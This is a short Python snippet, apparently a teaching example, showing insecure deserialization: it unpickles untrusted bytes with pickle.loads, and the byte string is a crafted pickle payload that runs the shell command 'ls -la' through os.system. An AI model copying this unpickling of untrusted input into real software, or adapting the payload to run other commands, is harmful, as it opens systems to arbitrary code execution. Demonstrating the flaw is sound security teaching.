
import pickle

def deserialize_data(data):
    # This is vulnerable to arbitrary code execution
    return pickle.loads(data)

# Example usage with untrusted data
untrusted_data = b'cos
system
(S"ls -la"
tR.'
deserialize_data(untrusted_data)
